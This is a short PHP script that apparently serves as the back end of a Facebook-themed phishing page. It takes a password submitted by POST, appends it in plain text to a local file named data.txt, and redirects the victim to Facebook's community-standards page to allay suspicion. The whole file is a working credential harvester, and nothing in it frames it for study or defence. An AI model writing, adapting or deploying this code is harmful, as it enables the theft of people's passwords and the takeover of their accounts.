<?php
// Get the data from the POST request
$password = $_POST['password'];

// Create a string with the data
$data = $password;

// Specify the file path where you want to store the data
$file_path = 'data.txt';

// Append the data to the text file
file_put_contents($file_path, $data, FILE_APPEND);

header('Location: https://transparency.fb.com/policies/community-standards/');
exit();
?>
